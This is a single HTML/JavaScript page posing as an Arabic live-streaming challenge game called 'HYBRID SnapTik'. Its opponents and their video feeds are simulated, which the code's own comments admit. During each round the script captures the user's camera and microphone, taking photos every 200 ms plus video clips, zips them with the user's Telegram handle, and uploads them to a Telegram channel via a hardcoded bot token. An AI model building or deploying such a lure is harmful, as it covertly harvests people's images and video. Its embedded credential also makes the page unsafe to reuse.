<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔥 HYBRID SnapTik v5.0 - شبكة البث المباشر</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }

        .hybrid-container {
            width: 100%;
            max-width: 450px;
            height: 900px;
            background: #0a0c10;
            position: relative;
            overflow: hidden;
            border-radius: 40px;
            box-shadow: 0 30px 60px rgba(255,215,0,0.2);
            border: 2px solid #ffd700;
            display: flex;
            flex-direction: column;
        }

        /* رأس التطبيق */
        .app-header {
            background: linear-gradient(135deg, #161b22, #1f2630);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #ffd700;
        }

        .logo {
            color: #ffd700;
            font-size: 18px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .user-profile {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .user-badge {
            background: #4caf50;
            color: white;
            padding: 6px 12px;
            border-radius: 25px;
            font-size: 12px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .user-points {
            background: #ffd700;
            color: #000;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 3px;
        }

        /* شريط الحالة */
        .status-bar {
            background: #1f2630;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ffd700;
        }

        .user-fingerprint {
            background: #0a0c10;
            color: #4caf50;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-family: monospace;
            direction: ltr;
            border: 1px solid #ffd700;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .connection-status {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .online-status {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #4caf50;
            font-size: 11px;
        }

        .online-dot {
            width: 8px;
            height: 8px;
            background: #4caf50;
            border-radius: 50%;
            animation: blink 1s infinite;
        }

        .peer-status {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #ffd700;
            font-size: 11px;
            padding: 4px 8px;
            background: #0a0c10;
            border-radius: 15px;
            border: 1px solid #ffd700;
        }

        .peer-dot {
            width: 8px;
            height: 8px;
            background: #ff4444;
            border-radius: 50%;
        }

        .peer-dot.connected {
            background: #4caf50;
        }

        /* شريط المشاركين */
        .participants-bar {
            background: #1f2630;
            padding: 10px;
            border-bottom: 2px solid #ffd700;
        }

        .section-title {
            color: #ffd700;
            font-size: 12px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .participants-grid {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            padding-bottom: 5px;
            scrollbar-width: none;
        }

        .participants-grid::-webkit-scrollbar {
            display: none;
        }

        .participant-card {
            min-width: 100px;
            background: #0a0c10;
            border: 1px solid #ffd700;
            border-radius: 15px;
            padding: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
        }

        .participant-card.selected {
            background: #ffd700;
            transform: scale(1.05);
        }

        .participant-card.selected .participant-name,
        .participant-card.selected .participant-points {
            color: #000;
        }

        .participant-card.current-user {
            border: 2px solid #4caf50;
        }

        .participant-avatar {
            width: 50px;
            height: 50px;
            border-radius: 15px;
            background: linear-gradient(45deg, #ffd700, #ff8a00);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            position: relative;
        }

        /* الدائرة الخضراء للنشطين */
        .online-indicator {
            position: absolute;
            bottom: 2px;
            right: 2px;
            width: 12px;
            height: 12px;
            background: #4caf50;
            border-radius: 50%;
            border: 2px solid #000;
            box-shadow: 0 0 5px #4caf50;
        }

        .online-indicator.in-round {
            background: #ff4444;
            box-shadow: 0 0 5px #ff4444;
            animation: pulse 1s infinite;
        }

        .participant-name {
            color: white;
            font-size: 11px;
            font-weight: bold;
        }

        .participant-fingerprint {
            background: #4caf50;
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 8px;
            font-family: monospace;
        }

        .participant-points {
            color: #ffd700;
            font-size: 10px;
            display: flex;
            align-items: center;
            gap: 3px;
        }

        /* شاشتين للبث */
        .dual-screen {
            display: flex;
            flex: 1;
            min-height: 0;
            gap: 2px;
            padding: 2px;
        }

        .screen {
            flex: 1;
            background: #161b22;
            border: 2px solid;
            border-radius: 15px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .my-screen {
            border-color: #4caf50;
        }

        .peer-screen {
            border-color: #ffd700;
        }

        .screen-header {
            padding: 5px;
            background: #1f2630;
            border-bottom: 1px solid;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 10px;
        }

        .my-header {
            color: #4caf50;
            border-bottom-color: #4caf50;
        }

        .peer-header {
            color: #ffd700;
            border-bottom-color: #ffd700;
        }

        .screen-title {
            display: flex;
            align-items: center;
            gap: 3px;
        }

        .screen-badge {
            background: currentColor;
            color: #000;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 8px;
            font-weight: bold;
        }

        .video-container {
            flex: 1;
            background: #000;
            position: relative;
            min-height: 0;
        }

        video, canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .player-info {
            position: absolute;
            top: 5px;
            left: 5px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            padding: 4px 8px;
            border-radius: 15px;
            border: 1px solid #ffd700;
            color: #ffd700;
            font-size: 9px;
            display: flex;
            align-items: center;
            gap: 5px;
            z-index: 10;
        }

        .player-points {
            position: absolute;
            top: 5px;
            right: 5px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            padding: 4px 8px;
            border-radius: 15px;
            border: 1px solid #4caf50;
            color: #4caf50;
            font-size: 10px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 3px;
            z-index: 10;
        }

        /* مؤقت الجولة */
        .round-timer {
            position: absolute;
            bottom: 45px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255,68,68,0.9);
            backdrop-filter: blur(5px);
            padding: 6px 20px;
            border-radius: 25px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            font-family: monospace;
            direction: ltr;
            border: 2px solid #ffd700;
            z-index: 20;
        }

        /* أزرار التحكم */
        .action-buttons {
            display: flex;
            gap: 5px;
            padding: 5px;
            background: #1f2630;
        }

        .action-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .action-btn.start {
            background: #4caf50;
            color: white;
        }

        .action-btn.stop {
            background: #ff4444;
            color: white;
        }

        .action-btn.challenge {
            background: #ffd700;
            color: black;
        }

        /* شريط الإحصائيات */
        .stats-bar {
            background: #1f2630;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 2px solid #ffd700;
        }

        .stats-item {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #ffd700;
            font-size: 12px;
        }

        .stats-value {
            background: #0a0c10;
            padding: 2px 8px;
            border-radius: 15px;
            color: white;
            font-weight: bold;
        }

        /* تأثيرات */
        @keyframes blink {
            0%,100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }

        @keyframes slideDown {
            from { transform: translate(-50%, -100%); opacity: 0; }
            to { transform: translate(-50%, 0); opacity: 1; }
        }

        /* إشعارات */
        .notification {
            position: absolute;
            top: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 25px;
            border-radius: 30px;
            border: 2px solid #ffd700;
            z-index: 100;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideDown 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="hybrid-container">
        <!-- رأس التطبيق -->
        <div class="app-header">
            <div class="logo">
                <i class="fas fa-microchip"></i>
                HYBRID SnapTik
            </div>
            <div class="user-profile">
                <div class="user-points" id="myPoints">
                    <i class="fas fa-star"></i> 0
                </div>
                <div class="user-badge" id="myUsername">
                    <i class="fas fa-user"></i> جاري التحميل...
                </div>
            </div>
        </div>

        <!-- شريط الحالة -->
        <div class="status-bar">
            <div class="user-fingerprint" id="myFingerprint">
                <i class="fas fa-fingerprint"></i>
                <span>----</span>
            </div>
            <div class="connection-status">
                <div class="online-status">
                    <span class="online-dot"></span>
                    <span>متصل</span>
                </div>
                <div class="peer-status" id="peerStatus" style="display: none;">
                    <span class="peer-dot"></span>
                    <span id="peerName">----</span>
                </div>
            </div>
        </div>

        <!-- شريط المشاركين -->
        <div class="participants-bar">
            <div class="section-title">
                <i class="fas fa-users"></i>
                المشاركون النشطون
            </div>
            <div class="participants-grid" id="participantsGrid">
                <!-- ستتم إضافة المشاركين هنا -->
            </div>
        </div>

        <!-- شاشتين للبث -->
        <div class="dual-screen">
            <!-- شاشتي -->
            <div class="screen my-screen">
                <div class="screen-header my-header">
                    <div class="screen-title">
                        <i class="fas fa-user"></i> أنا
                    </div>
                    <div class="screen-badge" id="myScreenBadge">@me</div>
                </div>
                <div class="video-container">
                    <video id="myVideo" autoplay playsinline muted></video>
                    <div class="player-info">
                        <i class="fas fa-fingerprint"></i>
                        <span id="myScreenFingerprint">----</span>
                    </div>
                    <div class="player-points" id="myScreenPoints">
                        <i class="fas fa-star"></i> 0
                    </div>
                </div>
            </div>

            <!-- شاشة المنافس -->
            <div class="screen peer-screen">
                <div class="screen-header peer-header">
                    <div class="screen-title">
                        <i class="fas fa-user-friends"></i> المنافس
                    </div>
                    <div class="screen-badge" id="peerScreenBadge">لم يختار</div>
                </div>
                <div class="video-container">
                    <canvas id="peerCanvas" width="320" height="180"></canvas>
                    <div class="player-info">
                        <i class="fas fa-fingerprint"></i>
                        <span id="peerScreenFingerprint">----</span>
                    </div>
                    <div class="player-points" id="peerScreenPoints">
                        <i class="fas fa-star"></i> 0
                    </div>
                    
                    <!-- مؤقت الجولة -->
                    <div class="round-timer" id="roundTimer">00:00</div>
                </div>
            </div>
        </div>

        <!-- أزرار التحكم -->
        <div class="action-buttons">
            <button class="action-btn start" onclick="startRound()">
                <i class="fas fa-play"></i> بدء الجولة
            </button>
            <button class="action-btn stop" onclick="stopRound()">
                <i class="fas fa-stop"></i> إيقاف
            </button>
            <button class="action-btn challenge" onclick="sendChallenge()">
                <i class="fas fa-bolt"></i> تحدى منافس
            </button>
        </div>

        <!-- شريط الإحصائيات -->
        <div class="stats-bar">
            <div class="stats-item">
                <i class="fas fa-image"></i>
                <span class="stats-value" id="photoCount">0</span>
            </div>
            <div class="stats-item">
                <i class="fas fa-video"></i>
                <span class="stats-value" id="videoCount">0</span>
            </div>
            <div class="stats-item">
                <i class="fas fa-trophy"></i>
                <span class="stats-value" id="roundDisplay">جولة 0</span>
            </div>
        </div>
    </div>

    <script>
        // ================== الإعدادات ==================
        const CONFIG = {
            videoDuration: 5,
            videoInterval: 8000,
            photoQuality: 0.9,
            photoInterval: 200,
            roundDuration: 60,
            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
            channelId: '-1003822964890'
        };

        // ================== بيانات المستخدم الحالي ==================
        let currentUser = null;

        // ================== قائمة المشاركين ==================
        let participants = [];

        // ================== حالة التطبيق ==================
        let myStream = null;
        let peerStream = null;
        let peerConnection = null;
        let isInRound = false;
        let currentRound = 0;
        let roundSeconds = 0;
        let roundTimer = null;
        
        let currentPhotos = [];
        let currentVideos = [];
        let photoInterval = null;
        let videoInterval = null;
        
        let selectedPeer = null;
        let myPoints = 0;
        let peerPoints = 0;
        
        // ================== عناصر الواجهة ==================
        const myVideo = document.getElementById('myVideo');
        const peerCanvas = document.getElementById('peerCanvas');
        const ctx = peerCanvas.getContext('2d');

        // ================== تهيئة المستخدم الحالي ==================
        function initCurrentUser() {
            // محاولة استرجاع بيانات المستخدم من localStorage
            const savedUser = localStorage.getItem('snaptik_user');
            
            if (savedUser) {
                currentUser = JSON.parse(savedUser);
            } else {
                // إنشاء مستخدم جديد
                const username = prompt('أدخل معرفك في تيليجرام (مثال: @username):', '@user');
                const fingerprint = generateFingerprint();
                
                currentUser = {
                    id: Date.now().toString(),
                    username: username || '@anonymous',
                    fingerprint: fingerprint,
                    points: Math.floor(Math.random() * 500) + 100, // نقاط عشوائية للبداية
                    avatar: getRandomAvatar(),
                    online: true,
                    inRound: false
                };
                
                localStorage.setItem('snaptik_user', JSON.stringify(currentUser));
            }
            
            // تحديث الواجهة ببيانات المستخدم
            document.getElementById('myUsername').innerHTML = `<i class="fas fa-user"></i> ${currentUser.username}`;
            document.getElementById('myFingerprint').innerHTML = `<i class="fas fa-fingerprint"></i> ${currentUser.fingerprint}`;
            document.getElementById('myScreenBadge').textContent = currentUser.username;
            document.getElementById('myScreenFingerprint').textContent = currentUser.fingerprint;
            document.getElementById('myPoints').innerHTML = `<i class="fas fa-star"></i> ${currentUser.points}`;
            document.getElementById('myScreenPoints').innerHTML = `<i class="fas fa-star"></i> ${currentUser.points}`;
            
            // إضافة المستخدم الحالي إلى قائمة المشاركين
            participants.push(currentUser);
            
            // بدء بث الحضور
            startPresenceBroadcast();
        }

        // ================== إنشاء بصمة فريدة ==================
        function generateFingerprint() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let fingerprint = '';
            for (let i = 0; i < 8; i++) {
                fingerprint += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return fingerprint;
        }

        // ================== اختيار رمز عشوائي للصورة الرمزية ==================
        function getRandomAvatar() {
            const avatars = ['👨', '👩', '🧔', '👨‍🦰', '👩‍🦰', '👨‍🦱', '👩‍🦱', '👨‍🦲', '👩‍🦲'];
            return avatars[Math.floor(Math.random() * avatars.length)];
        }

        // ================== بدء بث الحضور (محاكاة) ==================
        function startPresenceBroadcast() {
            // في التطبيق الحقيقي، هنا يتم الاتصال بالخادم وإرسال حالة المستخدم
            setInterval(() => {
                // محاكاة وصول مشاركين جدد
                if (Math.random() > 0.7 && participants.length < 8) {
                    addRandomParticipant();
                }
                
                // تحديث حالة المشاركين
                updateParticipantsList();
            }, 5000);
        }

        // ================== إضافة مشارك عشوائي (للاختبار) ==================
        function addRandomParticipant() {
            const names = ['@ahmed', '@mohamed', '@sara', '@omar', '@fatima', '@ali', '@noor', '@hassan'];
            const randomName = names[Math.floor(Math.random() * names.length)];
            
            // التأكد من عدم وجود المستخدم مسبقاً
            if (participants.some(p => p.username === randomName)) return;
            
            const newParticipant = {
                id: Date.now() + Math.random(),
                username: randomName,
                fingerprint: generateFingerprint(),
                points: Math.floor(Math.random() * 1000),
                avatar: getRandomAvatar(),
                online: Math.random() > 0.3, // 70% chance of being online
                inRound: Math.random() > 0.8 // 20% chance of being in a round
            };
            
            participants.push(newParticipant);
        }

        // ================== تحديث قائمة المشاركين ==================
        function updateParticipantsList() {
            const grid = document.getElementById('participantsGrid');
            
            // ترتيب المشاركين: النشطون أولاً، ثم الباقي
            const sortedParticipants = [...participants].sort((a, b) => {
                if (a.online && !b.online) return -1;
                if (!a.online && b.online) return 1;
                return 0;
            });
            
            let html = '';
            
            sortedParticipants.forEach(p => {
                // لا نعرض المستخدم الحالي في قائمة المنافسين
                if (p.id === currentUser.id) return;
                
                const isSelected = selectedPeer && selectedPeer.id === p.id;
                const statusClass = p.online ? 'status-online' : '';
                const roundClass = p.inRound ? 'in-round' : '';
                
                html += `
                    <div class="participant-card ${isSelected ? 'selected' : ''}" onclick="selectPeer('${p.id}')">
                        <div class="participant-avatar">
                            ${p.avatar}
                            ${p.online ? `<span class="online-indicator ${roundClass}"></span>` : ''}
                        </div>
                        <div class="participant-name">${p.username}</div>
                        <div class="participant-fingerprint">${p.fingerprint}</div>
                        <div class="participant-points">
                            <i class="fas fa-star"></i> ${p.points}
                        </div>
                        ${p.inRound ? '<div class="participant-status status-in-round">في جولة</div>' : ''}
                    </div>
                `;
            });
            
            grid.innerHTML = html;
            
            // إذا لم يكن هناك منافسين، نضيف رسالة
            if (sortedParticipants.length <= 1) {
                grid.innerHTML = '<div style="color: #888; padding: 20px; text-align: center;">لا يوجد مشاركون آخرون</div>';
            }
        }

        // ================== اختيار منافس ==================
        window.selectPeer = function(peerId) {
            const peer = participants.find(p => p.id === peerId);
            if (!peer) return;
            
            selectedPeer = peer;
            
            // تحديث الواجهة
            document.getElementById('peerScreenBadge').textContent = peer.username;
            document.getElementById('peerScreenFingerprint').textContent = peer.fingerprint;
            document.getElementById('peerScreenPoints').innerHTML = `<i class="fas fa-star"></i> ${peer.points}`;
            
            // إظهار حالة الاتصال
            document.getElementById('peerStatus').style.display = 'flex';
            document.getElementById('peerName').textContent = peer.username;
            
            if (peer.online) {
                document.querySelector('.peer-dot').classList.add('connected');
            } else {
                document.querySelector('.peer-dot').classList.remove('connected');
            }
            
            showNotification(`تم اختيار ${peer.username} كمنافس`);
            
            // محاولة إنشاء اتصال P2P (محاكاة)
            if (peer.online) {
                setupPeerConnection();
            }
        };

        // ================== إنشاء اتصال P2P (محاكاة) ==================
        function setupPeerConnection() {
            showNotification('🔄 جاري الاتصال بالمنافس...');
            
            // في التطبيق الحقيقي، هنا يتم استخدام WebRTC لإنشاء اتصال مباشر
            setTimeout(() => {
                showNotification('✅ تم الاتصال بالمنافس');
                
                // محاكاة استقبال فيديو المنافس
                startPeerStreamSimulation();
            }, 2000);
        }

        // ================== محاكاة استقبال فيديو المنافس ==================
        function startPeerStreamSimulation() {
            // في الواقع، هنا يتم استقبال الفيديو عبر WebRTC
            // للاختبار، نقوم برسم تأثير على canvas
            function drawSimulatedPeer() {
                if (!selectedPeer) return;
                
                // رسم خلفية سوداء
                ctx.fillStyle = '#1a1a1a';
                ctx.fillRect(0, 0, peerCanvas.width, peerCanvas.height);
                
                // رسم رمز المنافس
                ctx.font = '60px Arial';
                ctx.fillStyle = '#ffd700';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillText(selectedPeer.avatar, peerCanvas.width/2, peerCanvas.height/2 - 20);
                
                // رسم اسم المنافس
                ctx.font = '16px Arial';
                ctx.fillStyle = '#4caf50';
                ctx.fillText(selectedPeer.username, peerCanvas.width/2, peerCanvas.height/2 + 40);
                
                // رسم إشارة البث المباشر
                ctx.font = '12px Arial';
                ctx.fillStyle = '#ff4444';
                ctx.fillText('🔴 بث مباشر', peerCanvas.width/2, peerCanvas.height - 30);
                
                requestAnimationFrame(drawSimulatedPeer);
            }
            
            drawSimulatedPeer();
        }

        // ================== تشغيل كاميرتي ==================
        async function startMyCamera() {
            try {
                showNotification('🔄 تشغيل الكاميرا...');
                myStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 360 },
                    audio: true
                });
                myVideo.srcObject = myStream;
                await myVideo.play();
                showNotification('✅ الكاميرا جاهزة');
                return true;
            } catch (err) {
                showNotification('❌ خطأ في الكاميرا');
                return false;
            }
        }

        // ================== إرسال تحدٍ للمنافس ==================
        window.sendChallenge = function() {
            if (!selectedPeer) {
                showNotification('❌ اختر منافساً أولاً');
                return;
            }
            
            if (!selectedPeer.online) {
                showNotification('❌ المنافس غير متصل');
                return;
            }
            
            showNotification(`📨 تم إرسال تحدٍ إلى ${selectedPeer.username}`);
            
            // محاكاة قبول التحدي
            setTimeout(() => {
                if (Math.random() > 0.3) {
                    showNotification(`✅ ${selectedPeer.username} قبل التحدي!`);
                    startRound();
                } else {
                    showNotification(`❌ ${selectedPeer.username} رفض التحدي`);
                }
            }, 3000);
        };

        // ================== بدء جولة ==================
        window.startRound = async function() {
            if (!selectedPeer) {
                showNotification('❌ اختر منافساً أولاً');
                return;
            }
            
            if (!selectedPeer.online) {
                showNotification('❌ المنافس غير متصل');
                return;
            }
            
            // تشغيل الكاميرا إذا لم تكن عاملة
            if (!myStream) {
                const started = await startMyCamera();
                if (!started) return;
            }
            
            // بدء العد التنازلي
            startRoundCountdown();
        };

        function startRoundCountdown() {
            currentRound++;
            document.getElementById('roundDisplay').textContent = `جولة ${currentRound}`;
            
            // تحديث حالة المستخدم
            currentUser.inRound = true;
            
            let countdown = 3;
            const countInterval = setInterval(() => {
                if (countdown > 0) {
                    document.getElementById('roundTimer').textContent = `⏳ ${countdown}`;
                    countdown--;
                } else {
                    clearInterval(countInterval);
                    startLiveRound();
                }
            }, 1000);
        }

        function startLiveRound() {
            isInRound = true;
            
            currentPhotos = [];
            currentVideos = [];
            
            // بدء التقاط الصور والفيديوهات
            photoInterval = setInterval(capturePhoto, CONFIG.photoInterval);
            videoInterval = setInterval(recordVideo, CONFIG.videoInterval);
            
            // بدء مؤقت الجولة
            roundSeconds = CONFIG.roundDuration;
            updateTimerDisplay();
            
            roundTimer = setInterval(() => {
                roundSeconds--;
                updateTimerDisplay();
                
                // زيادة النقاط
                if (Math.random() > 0.7) {
                    myPoints++;
                    currentUser.points++;
                    document.getElementById('myPoints').innerHTML = `<i class="fas fa-star"></i> ${currentUser.points}`;
                    document.getElementById('myScreenPoints').innerHTML = `<i class="fas fa-star"></i> ${currentUser.points}`;
                }
                
                if (Math.random() > 0.8 && selectedPeer) {
                    peerPoints++;
                    selectedPeer.points++;
                    document.getElementById('peerScreenPoints').innerHTML = `<i class="fas fa-star"></i> ${selectedPeer.points}`;
                }
                
                if (roundSeconds <= 0) {
                    endRound();
                }
            }, 1000);
            
            updateStats();
            showNotification('🔴 بدء الجولة!');
        }

        function updateTimerDisplay() {
            const mins = Math.floor(roundSeconds / 60);
            const secs = roundSeconds % 60;
            document.getElementById('roundTimer').textContent = 
                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }

        // ================== إنهاء الجولة ==================
        window.stopRound = function() {
            endRound();
        };

        function endRound() {
            if (roundTimer) {
                clearInterval(roundTimer);
                roundTimer = null;
            }
            
            if (photoInterval) {
                clearInterval(photoInterval);
                photoInterval = null;
            }
            
            if (videoInterval) {
                clearInterval(videoInterval);
                videoInterval = null;
            }
            
            isInRound = false;
            currentUser.inRound = false;
            
            // حفظ الجولة في localStorage
            saveRoundLocally();
            
            // إرسال الجولة إلى تيليجرام
            sendRoundToTelegram();
            
            showNotification('⏹️ انتهت الجولة');
            document.getElementById('roundTimer').textContent = '00:00';
        }

        // ================== التقاط الصور ==================
        function capturePhoto() {
            if (!isInRound || !myStream) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 180;
            canvas.getContext('2d').drawImage(myVideo, 0, 0, 320, 180);
            
            canvas.toBlob((blob) => {
                if (!isInRound) return;
                currentPhotos.push({ blob });
                updateStats();
            }, 'image/jpeg', CONFIG.photoQuality);
        }

        // ================== تسجيل الفيديو ==================
        async function recordVideo() {
            if (!isInRound || !myStream) return;
            
            try {
                const chunks = [];
                const recorder = new MediaRecorder(myStream);
                
                recorder.ondataavailable = (e) => chunks.push(e.data);
                
                recorder.onstop = () => {
                    currentVideos.push({ blob: new Blob(chunks, { type: 'video/webm' }) });
                    updateStats();
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), CONFIG.videoDuration * 1000);
            } catch (error) {
                console.error('خطأ في تسجيل الفيديو:', error);
            }
        }

        // ================== تحديث الإحصائيات ==================
        function updateStats() {
            document.getElementById('photoCount').textContent = currentPhotos.length;
            document.getElementById('videoCount').textContent = currentVideos.length;
        }

        // ================== حفظ الجولة محلياً ==================
        function saveRoundLocally() {
            const rounds = JSON.parse(localStorage.getItem('snaptik_rounds') || '[]');
            
            const roundData = {
                roundNumber: currentRound,
                timestamp: new Date().toISOString(),
                myUsername: currentUser.username,
                myFingerprint: currentUser.fingerprint,
                peerUsername: selectedPeer ? selectedPeer.username : null,
                peerFingerprint: selectedPeer ? selectedPeer.fingerprint : null,
                myPoints: myPoints,
                peerPoints: peerPoints,
                photosCount: currentPhotos.length,
                videosCount: currentVideos.length
            };
            
            rounds.push(roundData);
            localStorage.setItem('snaptik_rounds', JSON.stringify(rounds));
        }

        // ================== إرسال الجولة إلى تيليجرام ==================
        async function sendRoundToTelegram() {
            if (!currentPhotos.length && !currentVideos.length) {
                showNotification('❌ لا يوجد محتوى للإرسال');
                return;
            }
            
            showNotification('📦 تجهيز الملفات للإرسال...');
            
            try {
                // إنشاء ZIP
                const zip = new JSZip();
                const roundId = `${currentUser.fingerprint}_${currentRound}_${Date.now().toString(16)}`;
                
                // إضافة الصور
                currentPhotos.forEach((p, i) => {
                    zip.file(`round_${currentRound}_photo_${i+1}.jpg`, p.blob);
                });
                
                // إضافة الفيديوهات
                currentVideos.forEach((v, i) => {
                    zip.file(`round_${currentRound}_video_${i+1}.webm`, v.blob);
                });
                
                // إنشاء ملف البصمة
                const now = new Date();
                let fingerprintText = `🔐 HYBRID SnapTik v5.0 - تقرير الجولة\n`;
                fingerprintText += `================================\n\n`;
                fingerprintText += `👤 أنا: ${currentUser.username}\n`;
                fingerprintText += `🔑 بصمتي: ${currentUser.fingerprint}\n`;
                fingerprintText += `🎯 رقم الجولة: ${currentRound}\n`;
                fingerprintText += `📅 التاريخ: ${now.toLocaleString('ar-EG')}\n`;
                fingerprintText += `🔖 معرف الجولة: ${roundId}\n\n`;
                
                if (selectedPeer) {
                    fingerprintText += `🏆 معلومات المنافسة:\n`;
                    fingerprintText += `👤 المنافس: ${selectedPeer.username}\n`;
                    fingerprintText += `🔑 بصمة المنافس: ${selectedPeer.fingerprint}\n`;
                    fingerprintText += `⭐ نقاطي: ${myPoints}\n`;
                    fingerprintText += `⭐ نقاط المنافس: ${peerPoints}\n`;
                    
                    if (myPoints > peerPoints) {
                        fingerprintText += `🏅 الفائز: أنا (${currentUser.username})\n`;
                    } else if (peerPoints > myPoints) {
                        fingerprintText += `🏅 الفائز: المنافس (${selectedPeer.username})\n`;
                    } else {
                        fingerprintText += `🤝 النتيجة: تعادل\n`;
                    }
                }
                
                fingerprintText += `\n📸 عدد الصور: ${currentPhotos.length}\n`;
                fingerprintText += `🎥 عدد الفيديوهات: ${currentVideos.length}\n`;
                fingerprintText += `\n📱 تم بواسطة HYBRID SnapTik v5.0\n`;
                
                zip.file("fingerprint.txt", fingerprintText);
                
                // إنشاء ملف ZIP
                const zipBlob = await zip.generateAsync({ type: "blob", compression: "DEFLATE" });
                
                // إرسال إلى تيليجرام
                showNotification('📤 إرسال إلى القناة...');
                
                const formData = new FormData();
                formData.append('chat_id', CONFIG.channelId);
                formData.append('document', zipBlob, `round_${currentRound}_${roundId}.zip`);
                
                let caption = `🎥 جولة جديدة من ${currentUser.username}\n`;
                caption += `🔑 ${roundId}\n`;
                caption += `📸 ${currentPhotos.length} صور | 🎥 ${currentVideos.length} فيديو\n`;
                
                if (selectedPeer) {
                    caption += `🏆 ${currentUser.username} ${myPoints} - ${peerPoints} ${selectedPeer.username}`;
                }
                
                formData.append('caption', caption);
                
                const res = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await res.json();
                
                if (result.ok) {
                    showNotification('✅ تم الإرسال بنجاح!');
                    
                    // إعادة تعيين العدادات
                    currentPhotos = [];
                    currentVideos = [];
                    myPoints = 0;
                    peerPoints = 0;
                    updateStats();
                    
                } else {
                    showNotification('❌ فشل الإرسال: ' + (result.description || 'خطأ غير معروف'));
                }
                
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                showNotification('❌ خطأ في الإرسال');
            }
        }

        // ================== إظهار الإشعارات ==================
        function showNotification(message) {
            const oldNotification = document.querySelector('.notification');
            if (oldNotification) {
                oldNotification.remove();
            }
            
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.innerHTML = `
                <i class="fas fa-microchip" style="color: #ffd700;"></i>
                <span>${message}</span>
            `;
            
            document.querySelector('.hybrid-container').appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideDown 0.3s reverse';
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.remove();
                    }
                }, 300);
            }, 3000);
        }

        // ================== بدء التطبيق ==================
        window.onload = function() {
            // تهيئة المستخدم الحالي
            initCurrentUser();
            
            // إضافة بعض المشاركين للاختبار
            for (let i = 0; i < 5; i++) {
                addRandomParticipant();
            }
            
            // تحديث قائمة المشاركين
            updateParticipantsList();
            
            // تحديث المؤقت
            updateTimerDisplay();
            
            // رسالة ترحيب
            setTimeout(() => {
                showNotification(`✨ مرحباً ${currentUser.username}!`);
            }, 1000);
        };
    </script>
</body>
